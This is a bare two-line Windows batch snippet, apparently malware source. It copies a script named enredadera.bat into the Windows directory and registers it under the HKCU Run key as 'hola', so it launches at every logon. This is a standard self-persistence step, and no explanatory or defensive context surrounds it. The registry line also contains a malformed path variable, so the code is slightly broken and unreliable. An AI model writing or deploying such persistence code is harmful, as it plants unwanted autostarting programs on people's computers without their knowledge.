copy enredadera.bat %windir%\enredadera.bat
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v hola /d %windir\enredadera.bat
